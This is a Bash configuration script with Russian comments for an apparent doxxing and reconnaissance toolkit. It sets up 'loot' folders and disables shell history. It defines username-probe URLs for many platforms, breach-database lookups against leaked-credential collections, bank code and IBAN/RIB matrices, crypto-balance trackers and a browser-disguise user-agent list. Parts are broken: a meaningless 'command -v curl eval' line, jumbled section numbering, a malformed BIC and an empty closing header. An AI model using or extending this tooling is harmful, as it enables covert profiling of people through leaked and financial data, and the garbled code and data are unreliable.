#!/bin/bash
# --- PRIME MASTER LAUNCHER v35.0m1 ---
CURRENT_VERSION="35.4"
G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
set +o history

CURRENT_IP=$(ip route get 1 2>/dev/null | awk '{print $7}')
[ -z "$CURRENT_IP" ] && CURRENT_IP="127.0.0.1"

SILENT="> /dev/null 2>&1"
# Использование:
command -v curl eval $SILENT

# --- CORE PATH INITIALIZATION ---
# Сначала определяем, где мы находимся
if [[ -n "$TERMUX_VERSION" ]]; then
    # Среда: Termux (Android)
    BASE_DIR="$HOME/core-prime-tools"
    PRIME_LOOT="$HOME/prime_loot"
    PRIME_SHARE="$HOME/prime_share"
    # Расширяем PATH для бинарников Termux
    PATH="$PATH:/data/data/com.termux/files/usr/bin"
else
    # Среда: Стандартный Linux
    # Проверяем, есть ли права root, чтобы решить, куда писать
    if [[ $EUID -eq 0 ]]; then
        BASE_DIR="/root/core-prime-tools"
        PRIME_LOOT="/root/prime_loot"
        PRIME_SHARE="/root/prime_share"
    else
        BASE_DIR="$HOME/core-prime-tools"
        PRIME_LOOT="$HOME/prime_loot"
        PRIME_SHARE="$HOME/prime_share"
    fi
fi

# Вторичные директории
MOD_DIR="$BASE_DIR/modules"

# Создание инфраструктуры (без ошибок доступа)
mkdir -p "$BASE_DIR" "$MOD_DIR" "$PRIME_LOOT" "$PRIME_SHARE" 2>/dev/null

export BASE_DIR MOD_DIR PRIME_LOOT PRIME_SHARE


# ==============================================================================
# 1. ГЛОБАЛЬНАЯ МАТРИЦА ПЛАТФОРМ ДЛЯ КРОСС-СПРАВОК (ULTIMATE OSINT CORE)
# ==============================================================================
# Формат: "URL_ПРЕФИКС|ТИП_ПРОВЕРКИ|МАРКЕР_ОШИБКИ|КАТЕГОРИЯ|НАЗВАНИЕ_СЕРВИСА"
GLOBAL_OSINT_SITES=(
    # --- Социальные сети и Мессенджеры (Social & Messengers) ---
    "https://t.me/|HTTP_CODE|404|SOCIAL|Telegram"
    "https://www.instagram.com/|HTTP_CODE|404|SOCIAL|Instagram"
    "https://x.com/|TEXT_ABSENT|page doesn’t exist|SOCIAL|X (Twitter)"
    "https://vk.com/|TEXT_ABSENT|ID_NOT_FOUND|SOCIAL|VKontakte"
    "https://ok.ru/|HTTP_CODE|404|SOCIAL|Odnoklassniki"
    "https://www.facebook.com/|HTTP_CODE|404|SOCIAL|Facebook"
    "https://www.tiktok.com/@|TEXT_ABSENT|not found|SOCIAL|TikTok"
    
    # --- Профессиональные, ИТ-платформы и Репозитории (Dev & Tech) ---
    "https://github.com/|HTTP_CODE|404|DEV|GitHub"
    "https://gitlab.com/|HTTP_CODE|404|DEV|GitLab"
    "https://bitbucket.org/|HTTP_CODE|404|DEV|BitBucket"
    "https://www.linkedin.com/in/|HTTP_CODE|404|DEV|LinkedIn"
    "https://habr.com/ru/users/|HTTP_CODE|404|DEV|Habr"
    "https://stackoverflow.com/users/story/|HTTP_CODE|404|DEV|StackOverflow"
    "https://hub.docker.com/u/|HTTP_CODE|404|DEV|DockerHub"
    "https://pypi.org/user/|HTTP_CODE|404|DEV|PyPI"
    
    # --- Блоги, Форумы и Контент-платформы (Blogs & Forums) ---
    "https://www.reddit.com/user/|HTTP_CODE|404|BLOG|Reddit"
    "https://medium.com/@|HTTP_CODE|404|BLOG|Medium"
    "https://pikabu.ru/@|HTTP_CODE|404|BLOG|Pikabu"
    "https://vc.ru/u/|HTTP_CODE|404|BLOG|VCRu"
    "https://www.tumblr.com/|HTTP_CODE|404|BLOG|Tumblr"
    "https://archive.org/details/@|HTTP_CODE|404|BLOG|Archive.org"
    
    # --- Видео, Музыка и Стриминг (Media & Streaming) ---
    "https://www.youtube.com/@|HTTP_CODE|404|MEDIA|YouTube"
    "https://www.twitch.tv/|HTTP_CODE|404|MEDIA|Twitch"
    "https://vimeo.com/|HTTP_CODE|404|MEDIA|Vimeo"
    "https://soundcloud.com/|HTTP_CODE|404|MEDIA|SoundCloud"
    "https://open.spotify.com/user/|HTTP_CODE|404|MEDIA|Spotify"
    "https://www.dailymotion.com/|HTTP_CODE|404|MEDIA|Dailymotion"
    
    # --- Дизайн, Фото, Портфолио (Design & Creative) ---
    "https://www.pinterest.com/|HTTP_CODE|404|DESIGN|Pinterest"
    "https://www.behance.net/|HTTP_CODE|404|DESIGN|Behance"
    "https://www.deviantart.com/|HTTP_CODE|404|DESIGN|DeviantArt"
    "https://www.flickr.com/people/|HTTP_CODE|404|DESIGN|Flickr"
    "https://www.artstation.com/|HTTP_CODE|404|DESIGN|ArtStation"
    "https://unsplash.com/@|HTTP_CODE|404|DESIGN|Unsplash"
    
    # --- Игровые платформы (Gaming Infrastructure) ---
    "https://steamcommunity.com/id/|TEXT_ABSENT|The specified profile could not be found|GAMING|Steam"
    "https://www.chess.com/member/|HTTP_CODE|404|GAMING|Chess.com"
    "https://psnprofiles.com/|HTTP_CODE|404|GAMING|PSNProfiles"
    
    # --- Фриланс и Коммерция (Freelance & SaaS) ---
    "https://www.fl.ru/users/|HTTP_CODE|404|COMMERCE|FL.ru"
    "https://www.freelancer.com/u/|HTTP_CODE|404|COMMERCE|Freelancer"
    "https://www.patreon.com/|HTTP_CODE|404|COMMERCE|Patreon"
    "https://www.fiverr.com/|HTTP_CODE|404|COMMERCE|Fiverr"
)

# ==============================================================================
# 2. МАТРИЦА ПОЧТОВЫХ ПРОВАЙДЕРОВ ДЛЯ ВАЛИДАЦИИ И OSINT (ULTIMATE EMAIL CORE)
# ==============================================================================
GLOBAL_EMAIL_DOMAINS=(
    # --- Международные гиганты (Global Providers) ---
    "gmail.com|GLOBAL|Google Mail"
    "yahoo.com|GLOBAL|Yahoo Mail"
    "outlook.com|GLOBAL|Microsoft Outlook"
    "hotmail.com|GLOBAL|Microsoft Hotmail Legacy"
    "icloud.com|GLOBAL|Apple iCloud"
    "aol.com|GLOBAL|AOL Mail"
    "zoho.com|GLOBAL|Zoho Mail"
    
    # --- Регион СНГ (CIS Mail Services) ---
    "mail.ru|CIS|Mail.ru Group"
    "internet.ru|CIS|Mail.ru Clean Domain"
    "bk.ru|CIS|Mail.ru Subdomain (BK)"
    "inbox.ru|CIS|Mail.ru Subdomain (Inbox)"
    "list.ru|CIS|Mail.ru Subdomain (List)"
    "yandex.ru|CIS|Yandex Mail (RU)"
    "yandex.kz|CIS|Yandex Mail (KZ)"
    "yandex.by|CIS|Yandex Mail (BY)"
    "ya.ru|CIS|Yandex Short Domain"
    "rambler.ru|CIS|Rambler Mail"
    "ukr.net|CIS|Ukr.net Mail"
    
    # --- Криптографические и защищенные сервисы (Encrypted & Secure) ---
    "proton.me|SECURE|ProtonMail Modern"
    "protonmail.com|SECURE|ProtonMail Legacy"
    "tutanota.com|SECURE|Tutanota Secure"
    "tuta.com|SECURE|Tuta Mail Modern"
    "mailfence.com|SECURE|Mailfence Crypt"
    "startmail.com|SECURE|StartMail Private"
    
    # --- Локальные и ISP провайдеры (Western Europe & US Regional) ---
    "gmx.de|EUROPE|GMX Mail (Germany)"
    "gmx.net|EUROPE|GMX Mail International"
    "web.de|EUROPE|Web.de (Germany)"
    "orange.fr|EUROPE|Orange S.A. (France)"
    "wanadoo.fr|EUROPE|Orange Legacy (France)"
    "free.fr|EUROPE|Free Telecom (France)"
    "sfr.fr|EUROPE|SFR Box Mail (France)"
    "laposte.net|EUROPE|La Poste (France)"
    "libero.it|EUROPE|Libero Mail (Italy)"
    "t-online.de|EUROPE|Deutsche Telekom"
    "comcast.net|US_ISP|Comcast Cable"
    "verizon.net|US_ISP|Verizon Telecom"
    "att.net|US_ISP|AT&T Webmail"
    
    # --- Сервисы временных и одноразовых почт (Disposable / Burner Email) ---
    "yopmail.com|DISPOSABLE|YOPmail Burner"
    "mailinator.com|DISPOSABLE|Mailinator Public"
    "10minutemail.com|DISPOSABLE|10MinuteMail"
    "temp-mail.org|DISPOSABLE|Temp-Mail Engine"
    "guerrillamail.com|DISPOSABLE|GuerrillaMail"
    "trashmail.com|DISPOSABLE|TrashMail Manager"
)

   
# ==============================================================================
# 3. МЕЖДУНАРОДНЫЕ ТЕЛЕФОННЫЕ КОДЫ ДЛЯ OSINT И ГЕО-АНАЛИЗА (ULTIMATE TELEPHONY)
# ==============================================================================
GLOBAL_PHONE_CODES=(
    # --- Зона СНГ и Ближнее Зарубежье (CIS Region) ---
    "+7|RU|Россия"
    "+77|KZ|Казахстан"
    "+380|UA|Украина"
    "+375|BY|Беларусь"
    "+994|AZ|Азербайджан"
    "+374|AM|Армения"
    "+995|GE|Грузия"
    "+996|KG|Кыргызстан"
    "+992|TJ|Таджикистан"
    "+993|TM|Туркменистан"
    "+998|UZ|Узбекистан"
    "+373|MD|Молдова"
    
    # --- Западная и Центральная Европа (Europe Zone) ---
    "+33|FR|Франция"
    "+44|GB|Великобритания"
    "+49|DE|Германия"
    "+48|PL|Польша"
    "+34|ES|Испания"
    "+39|IT|Италия"
    "+41|CH|Швейцария"
    "+31|NL|Нидерланды"
    "+32|BE|Бельгия"
    "+43|AT|Австрия"
    "+420|CZ|Чехия"
    "+36|HU|Венгрия"
    "+40|RO|Румыния"
    "+351|PT|Португалия"
    "+30|GR|Греция"
    
    # --- Балтия и Скандинавия (Baltic & Scandinavia) ---
    "+370|LT|Литва"
    "+371|LV|Латвия"
    "+372|EE|Эстония"
    "+46|SE|Швеция"
    "+47|NO|Норвегия"
    "+45|DK|Дания"
    "+358|FI|Финляндия"
    
    # --- Северная и Латинская Америка (Americas) ---
    "+1|US|США"
    "+1|CA|Канада"
    "+52|MX|Мексика"
    "+55|BR|Бразилия"
    "+54|AR|Аргентина"
    "+57|CO|Колумбия"
    
    # --- Азия и Ближний Восток (Asia & Middle East) ---
    "+90|TR|Турция"
    "+971|AE|ОАЭ"
    "+972|IL|Израиль"
    "+86|CN|Китай"
    "+81|JP|Япония"
    "+82|KR|Южная Корея"
    "+91|IN|Индия"
    "+65|SG|Сингапур"
    "+66|TH|Таиланд"
    "+84|VN|Вьетнам"
    "+62|ID|Индонезия"
    
    # --- Другие Ключевые Регионы (Other Global Regions) ---
    "+61|AU|Австралия"
    "+64|NZ|Новая Зеландия"
    "+27|ZA|ЮАР"
    "+20|EG|Египет"
)

# ==============================================================================
# 11. МАТРИЦА ФИНАНСОВЫХ ИНСТИТУТОВ И БАНКОВСКИХ КОДОВ (ULTIMATE BANK MATRIX)
# ==============================================================================
# Формат: "КОД_BANQUE_ИЛИ_SWIFT_PREFIX|BIC_SWIFT|НАЗВАНИЕ_БАНКА|РЕГИОН"
GLOBAL_BANK_MATRIX=(
    # --- Крупнейшие Французские Банки и Традиционная Сеть (RIB / SEPA FR) ---
    "30002|BNPAFRPP|BNP Paribas|Франция (FR)"
    "30003|SOGEFRPP|Société Générale|Франция (FR)"
    "30004|CAGRFRPP|Crédit Agricole|Франция (FR)"
    "30066|CMCIFRPP|Crédit Mutuel|Франция (FR)"
    "10278|POSSFRPP|La Banque Postale|Франция (FR)"
    "30007|CEPACFRP|BPCE (Banque Populaire / Caisse d'Epargne)|Франция (FR)"
    "16108|LCLXFRPP|LCL (Le Crédit Lyonnais)|Франция (FR)"
    "10207|CHAFFRPP|Crédit du Nord|Франция (FR)"
    "30056|HSBCFRPP|HSBC Continental Europe (France)|Франция (FR)"
    "42559|BICPFRPP|Banque Palatine|Франция (FR)"
    
    # --- Французские Необанки и Финтех (Digital & FinTech FR) ---
    "14518|BOURFRPP|BoursoBank (ex-Boursorama)|Франция (FR)"
    "11708|FOTEFRPP|Fortuneo|Франция (FR)"
    "17515|N26EFR2X|N26 (French Branch)|Франция (FR)"
    "16575|REVOFR21|Revolut (French Branch)|Франция (FR)"
    "17315|NICKFRPP|Compte Nickel (Financière des Paiements)|Франция (FR)"
    "17218|QONTFRPP|Qonto (Olinda SAS)|Франция (FR)"
    "17525|BUNQFRWW|Bunq (French Branch)|Франция (FR)"
    "11328|HELLFRPP|Hello Bank!|Франция (FR)"
    
    # --- Международные и Европейские Гиганты (Global SWIFT) ---
    "BARC|BARCGB2L|Barclays Bank|Великобритания (UK)"
    "HSBC|HSBCHGB2L|HSBC Holdings|Великобритания (UK)"
    "DEUT|DEUTDEFF|Deutsche Bank|Германия (DE)"
    "COMM|COERDEFF|Commerzbank|Германия (DE)"
    "INGB|INGBNL2A|ING Group|Нидерланды (NL)"
    "SANTA|BSCHESMM|Banco Santander|Испания (ES)"
    "CHAS|CHASUS33|JPMorgan Chase|США (US)"
    "CITI|CITIUS33|Citigroup|США (US)"
    "UBSW|UBSWCHZH|UBS Group|Швейцария (CH)"
    "BNPA|BNPABEBB|BNP Paribas Fortis|Бельгия (BE)"
    
        # --- Крупнейшие Банки СНГ (SWIFT & Национальные Системы) ---
    "SBER|SABRRUMM|Сбербанк|Россия (RU)"
    "VTBR|VTBRRU2M|ВТБ|Россия (RU)"
    "ALFA|ALFARU2A|Альфа-Банк|Россия (RU)"
    "TCSB|TCSBRUM1|Т-Банк (Тинкофф)|Россия (RU)"
    "VBRR|VBRRRUM1|ВБРР|Россия (RU)"
    "KZBK|KSBKKZKX|Kaspi Bank|Казахстан (KZ)"
    "HALK|HSBKKZKX|Halyk Bank|Казахстан (KZ)"
    "BCCK|KREDKZKX|Банк ЦентрКредит|Казахстан (KZ)"
    "BAPB|BAPBBY2X|Белагропромбанк|Беларусь (BY)"
    "ASB|AKBBBY2X|Беларусбанк|Беларусь (BY)"
    "PBUA|PBUAUA2X|ПриватБанк|Украина (UA)"

)


# ==============================================================================
# 4. КРИПТОГРАФИЧЕСКИЕ СИГНАТУРЫ ДЛЯ БЛОКЧЕЙН-ТРЕКИНГА (ULTIMATE CRYPTO CORE)
# ==============================================================================
GLOBAL_CRYPTO_TYPES=(
    "\b0x[0-9a-fA-F]{40}\b|Ethereum (ETH) / Binance Smart Chain (BSC) / Polygon / ERC-20"
    "\b[13][a-km-zA-HJ-NP-Z1-9]{26,33}\b|Bitcoin (BTC) Legacy / P2SH Address"
    "\bbc1[a-zA-Z0-9]{25,39}\b|Bitcoin (BTC) Native SegWit (Bech32)"
    "\bbc1[pP][a-zA-Z0-9]{58}\b|Bitcoin (BTC) Taproot / Schnorr Signatures (Bech32m)"
    "\bT[a-zA-Z0-9]{33}\b|TRON (TRX) / Tether USD (USDT-TRC20)"
    "\b4[0-9a-zA-Z]{94}\b|Monero (XMR) Stealth Cryptonote Wallet"
    "\b[49][1-9A-HJ-NP-Za-km-z]{94,105}\b|Monero (XMR) Integrated Wallet Address"
    "\br[0-9a-zA-Z]{24,34}\b|Ripple (XRP) Ledger Address"
    "\bD[a-km-zA-HJ-NP-Z1-9]{33}\b|Dogecoin (DOGE) Address"
    "\b[L3][a-km-zA-HJ-NP-Z1-9]{26,33}\b|Litecoin (LTC) Legacy / Script Address"
    "\bltc1[a-zA-Z0-9]{25,43}\b|Litecoin (LTC) Native SegWit Address"
)


# ==============================================================================
# 7. ВЕРИФИКАЦИЯ МЕЖДУНАРОДНЫХ БАНКОВСКИХ РЕКВИЗИТОВ (ULTIMATE FININTEL NODES)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|РЕГИОН|НАЗВАНИЕ_УЗЛА"
# Плейсхолдеры: {IBAN}, {BIC}, {BIK} автоматически подменяются ядром.
GLOBAL_API_FINANCE_NODES=(
    # --- Международные валидаторы структуры IBAN (Global Verification) ---
    "https://api.openiban.org/validate/{IBAN}|GET|JSON|GLOBAL|OpenIBAN Community Engine"
    "https://api.ibanapi.com/v1/validate/{IBAN}?api_key=free|GET|JSON|GLOBAL|IBANAPI Public Gateway"
    "https://api.validiban.com/v1/check/{IBAN}|GET|JSON|GLOBAL|ValidIBAN Border Node"
    
    # --- Европейские шлюзы и реестры SEPA (Франция / Еврозона) ---
    "https://relais.epsoft.fr/api/iban/{IBAN}|GET|JSON|EUROPE|EPSoft SEPA Router (FR)"
    "https://api.bankauth.co/v1/iban/verify?target={IBAN}|GET|JSON|EUROPE|BankAuth Compliance Node"
    "https://api.upclink.com/v1/iban/{IBAN}|GET|JSON|EUROPE|UPCLink EuroBank Validator"
    
    # --- Декодеры BIC / SWIFT кодов (Routing & SWIFT Intel) ---
    "https://api.swiftcodesfinder.com/v1/swift/{BIC}|GET|JSON|SWIFT|SWIFT Codes Finder Core"
    "https://bank-code.net/api/v1/bic/{BIC}|GET|JSON|SWIFT|BankCode Net International"
    "https://api.api-ninjas.com/v1/bank?bic={BIC}|GET|JSON|SWIFT|ApiNinjas Bank Infrastructure"
    
    # --- Национальные реестры и БИК (СНГ / Центральные Банки) ---
    "http://www.cbr.ru/scripts/XML_bic.asp?bic={BIK}|GET|XML|CIS_RU|Центральный Банк РФ (Официальный)"
    "https://bik-info.ru/api.html?bik={BIK}|GET|JSON|CIS_RU|BikInfo National Registry"
    "https://api.post.kz/api/v1/banks/bic/{BIK}|GET|JSON|CIS_KZ|АО Казпочта / Нацбанк РК"
)

# ==============================================================================
# УЛЬТИМАТИВНАЯ МАТРИЦА ВНЕШНИХ API-ЭНДПОИНТОВ (GLOBAL OSINT API ENDPOINTS)
# ==============================================================================
# Формат структуры: "БАЗОВЫЙ_URL|СИСТЕМНОЕ_ИМЯ_ПЛАТФОРМЫ"

# ==============================================================================
# 1. АНАЛИЗ ПАРАМЕТРОВ МОБИЛЬНЫХ НОМЕРОВ (ULTIMATE PHONE INTEL NODES)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|РЕГИОН|НАЗВАНИЕ_УЗЛА"
# Плейсхолдер {PHONE} должен содержать номер в международном формате без знака "+"
GLOBAL_API_PHONE_NODES=(
    # --- Международные и Европейские шлюзы (Global / EU Telecom Intel) ---
    "https://api.numlookupapi.com/v1/validate/{PHONE}?api_key=free|GET|JSON|GLOBAL|NumLookupProvider Core"
    "https://api.phone-validator.net/api/v2/verify?PhoneNumber={PHONE}&CountryCode=FR|GET|JSON|EUROPE|PhoneValidator EU"
    "https://ipqualityscore.com/api/json/phone/free/{PHONE}|GET|JSON|GLOBAL|IPQualityScore Phone Fraud Radar"
    
    # --- Локальные и государственные реестры СНГ (CIS Регион) ---
    "https://htmlweb.ru/geo/api.php?json&telcod={PHONE}|GET|JSON|CIS_RU|HtmlWeb GeoAPI National"
    "https://rosreestr.space/api/v1/phone/{PHONE}|GET|JSON|CIS_RU|Rosreestr Space Telecom Decoder"
    "https://api.mtt.ru/reestr/get_operator?phone={PHONE}|GET|JSON|CIS_RU|АО МТТ Официальный Реестр"
    "https://opendata.kz/api/v1/telecom/operator/{PHONE}|GET|JSON|CIS_KZ|OpenData Kazakhstan (Казпочта)"
)

# ==============================================================================
# 2. МОНИТОРИНГ ГЛОБАЛЬНЫХ БАЗ УТЕЧЕК И COMB (ULTIMATE BREACH INTEL)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|ВЕКТОР_ДАННЫХ|НАЗВАНИЕ_УЗЛА"
# Плейсхолдер {TARGET} автоматически заменяется очищенным вектором (Email/Phone/User)
GLOBAL_API_BREACH_NODES=(
    # --- Публичные реестры агрегаторов утечек (COMB Core) ---
    "https://api.proxynova.com/comb?query={TARGET}|GET|JSON|ALL|ProxyNova COMB Registry"
    "https://leakcheck.io/api/v2/public/use/{TARGET}|GET|JSON|ALL|LeakCheck Open Engine v2"
    
    # --- Международные OSINT-шлюзы верификации компрометации ---
    "https://api.breachdirectory.org/v1/check?term={TARGET}|GET|JSON|ALL|BreachDirectory Security Node"
    "https://api.haveibeenpwned.com/v3/breachedaccount/{TARGET}|GET|JSON|EMAIL|HaveIBeenPwned Core (Requires Header)"
    "https://intelx.io/API/v1/search/phone?phone={TARGET}|GET|JSON|PHONE|IntelligenceX Phone Leak Matrix"
    
    # --- Локальные и специализированные базы (СНГ & Текстовые дампы) ---
    "https://leaklookup.com/api/v1/search|POST|JSON|ALL|LeakLookup Cross-Platform Gate"
    "https://api.pwned.ru/v1/check/{TARGET}|GET|JSON|ALL|PwnedRu CIS Breach Index"
)

# ==============================================================================
# 3. АНАЛИТИКА СЕТЕВОЙ ИНФРАСТРУКТУРЫ И ПРОВАЙДЕРОВ (ULTIMATE IP/ASN INTEL)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|ВЕКТОР_ДАННЫХ|НАЗВАНИЕ_УЗЛА"
# Плейсхолдеры {IP} и {ASN} автоматически заменяются сигнатурным ядром.
GLOBAL_API_NETWORK_NODES=(
    # --- Глобальные геораспределенные декодеры IP (GeoIP & ISP Intel) ---
    "http://ip-api.com/json/{IP}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting|GET|JSON|IP|IP-API Co Deep Decoder"
    "https://ipapi.co/{IP}/json/|GET|JSON|IP|IPapi Co Standard Node"
    "https://freeipapi.com/api/json/{IP}|GET|JSON|IP|FreeIPAPI High-Rate Gate"
    
    # --- Трекеры маршрутизации, подсетей и автономных систем (BGP & ASN Intel) ---
    "https://api.bgpview.io/ip/{IP}|GET|JSON|IP|BGPView IP-to-ASN Tracker"
    "https://api.bgpview.io/asn/{ASN}|GET|JSON|ASN|BGPView ASN Infrastructure Core"
    "https://stat.ripe.net/data/network-info/data.json?resource={IP}|GET|JSON|IP|RIPE NCC Regional Internet Registry"
    "https://stat.ripe.net/data/as-overview/data.json?resource={ASN}|GET|JSON|ASN|RIPE NCC ASN Routing Matrix"
)

# ==============================================================================
# 4. КРИПТОГРАФИЧЕСКИЙ ТРЕКИНГ БАЛАНСОВ (ULTIMATE CRYPTO LEDGER INTEL)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|БЛОКЧЕЙН_СЕТЬ|НАЗВАНИЕ_УЗЛА"
# Плейсхолдер {ADDRESS} автоматически заменяется валидным криптокошельком.
GLOBAL_API_CRYPTO_NODES=(
    # --- Bitcoin Сеть (BTC Ledger / UTXO Infrastructure) ---
    "https://blockchain.info/rawaddr/{ADDRESS}|GET|JSON|BTC|BlockchainInfo Public Ledger"
    "https://api.blockcypher.com/v1/btc/main/addrs/{ADDRESS}/balance|GET|JSON|BTC|BlockCypher BTC Node"
    
    # --- Ethereum Сеть (ETH / ERC-20 / EVM RPC Infrastructure) ---
    "https://rpc.ankr.com/eth|POST|JSON|ETH|Ankr EVM High-Performance RPC"
    "https://ethereum-rpc.publicnode.com|POST|JSON|ETH|PublicNode Decentralized EVM Gateway"
    
    # --- TRON Сеть (TRX / TRC-20 / TRON-EVM Infrastructure) ---
    "https://apilist.tronscan.org/api/account?address={ADDRESS}|GET|JSON|TRX|TronScan Core Ledger"
    "https://api.trongrid.io/v1/accounts/{ADDRESS}|GET|JSON|TRX|TronGrid Official Border Node"
)

# ==============================================================================
# 5. ИНТЕЛЛЕКТ ДОМЕННЫХ ИМЕН, DNS И СЕРВЕРОВ (ULTIMATE DOMAIN & DNS INTEL)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|ВЕКТОР_ДАННЫХ|НАЗВАНИЕ_УЗЛА"
# Плейсхолдеры {DOMAIN} и {IP} автоматически заменяются сигнатурным ядром.
GLOBAL_API_DOMAIN_NODES=(
    # --- Высокопроизводительные DoH-декодеры (DNS Over HTTPS Core) ---
    "https://dns.google/resolve?name={DOMAIN}&type=ANY|GET|JSON|DOMAIN|Google Secure DoH Core"
    "https://cloudflare-dns.com/dns-query?name={DOMAIN}&type=ANY|GET|DNS_JSON|DOMAIN|Cloudflare Quad1 DoH Gateway"
    
    # --- Проверка регистрационных данных и возраста домена (WHOIS / RDAP) ---
    "https://rdap.org/domain/{DOMAIN}|GET|JSON|DOMAIN|ICANN RDAP International Registry"
    
    # --- Пассивный поиск субдоменов и OSINT сертификатов (Certificate Transparency) ---
    "https://crt.sh/?q={DOMAIN}&output=json|GET|JSON|DOMAIN|COMODO Certificate Transparency Ledger"
    
    # --- Реверсивный DNS-трекинг инфраструктуры (Reverse DNS) ---
    "https://api.viewdns.info/reversedns/?ip={IP}&output=json|GET|JSON|IP|ViewDNS Infrastructure Matrix"
)

# ==============================================================================
# 6. МЕТАДАННЫЕ, СОЦСЕТИ И ПОИСК СВЯЗЕЙ (ULTIMATE SOCIAL IDENTITY INTEL)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|ВЕКТОР_ДАННЫХ|НАЗВАНИЕ_УЗЛА"
# Плейсхолдер {USER} автоматически заменяется очищенным никнеймом или идентификатором.
GLOBAL_API_IDENTITY_NODES=(
    # --- Профессиональный и разработческий цифровой след (Dev Intel) ---
    "https://api.github.com/users/{USER}|GET|JSON|USER|GitHub Developer Core API"
    "https://api.github.com/users/{USER}/events/public|GET|JSON|USER|GitHub Public Activity Tracker"
    
    # --- Архивный цифровой след и история изменений (Wayback Machine) ---
    "https://archive.org/advancedsearch.php?q=creator%3A%22{USER}%22&output=json|GET|JSON|USER|Wayback Machine Meta-Archive"
    "https://web.archive.org/cdx/search/cdx?url=*.{USER}*&output=json&limit=50|GET|JSON|DOMAIN|Wayback Machine URL Indexer"
    
    # --- Публичные метаданные мессенджеров и платформ (Public Web OSINT) ---
    "https://t.me/s/{USER}|GET|HTML|USER|Telegram Channel/Profile Web Stream"
    "https://boards-api.greenhouse.io/v1/boards/{USER}/jobs|GET|JSON|USER|Greenhouse Corporate Job Boards"
)


# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска и валидации Email
# ==============================================================================
GLOBAL_REGEX_EMAIL="(?i)\b[a-z0-9._%+-]+@([a-z0-9-]+\.)+[a-z]{2,63}\b"
# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска и валидации телефонов
# ==============================================================================
GLOBAL_REGEX_PHONE="(?i)(?:\+?([0-9]{1,4})[\s.-]?)?(?:\([0-9]{1,5}\)[\s.-]?)?([0-9]{2,5}[\s.-]?){2,5}[0-9]{2,5}"


# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска IPv4/IPv6 и CIDR
# ==============================================================================
GLOBAL_REGEX_IP="(?i)\b(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(/[0-9]{1,2})?|([0-9a-f]{1,4}:){1,7}:?([0-9a-f]{1,4})?(:[0-9a-f]{1,4}){1,7}(/[0-9]{1,3})?)\b"

# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска и валидации доменов
# ==============================================================================
GLOBAL_REGEX_DOMAIN="(?i)\b((xn--[a-z0-9-]{1,59}|[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)\.)+([a-z]{2,63}|xn--[a-z0-9-]{1,59})\b"


# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска и валидации IBAN
# ==============================================================================
GLOBAL_REGEX_IBAN="(?i)\b[a-z]{2}[0-9]{2}([a-z0-9]\s*){10,30}[a-z0-9]\b"

# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска и валидации RIB (FR)
# ==============================================================================
GLOBAL_REGEX_RIB="(?i)\b[0-9]{5}[\s.-]?[0-9]{5}[\s.-]?[a-z0-9]{11}[\s.-]?[0-9]{2}\b"

# Сигнатурный разделитель метаданных в системных логах (Loot Splitting Pattern)
GLOBAL_REGEX_BRIDGE_DELIMITER=" -> "


# ==============================================================================
# 12. МАТРИЦА ЛЕГИТИМНЫХ ОКРУЖЕНИЙ И USER-AGENTS (ULTIMATE UA ROTATOR)
# ==============================================================================
GLOBAL_NETWORK_UA=(
    # --- Windows 11 / Современные браузеры (Corporate Desktop Standard) ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Edge/124.0.0.0"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
    
    # --- macOS / Apple экосистема (Premium Consumer Segment) ---
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
    
    # --- Linux / Профессиональные рабочие станции (Developer/Sysadmin Trace) ---
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
    
    # --- Мобильный трафик (Mobile Mesh / High-Trust Bypassing) ---
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/605.1.15"
)
# ==============================================================================
# МАТРИЦЫ ДЛЯ АНАЛИЗА ИНФРАСТРУКТУРЫ И АРТЕФАКТОВ (INFRASTRUCTURE & STATIC CORE)
# ==============================================================================
# ==============================================================================
# @description: Ультимативный паттерн поиска веб-документов и системных секретов
# ==============================================================================
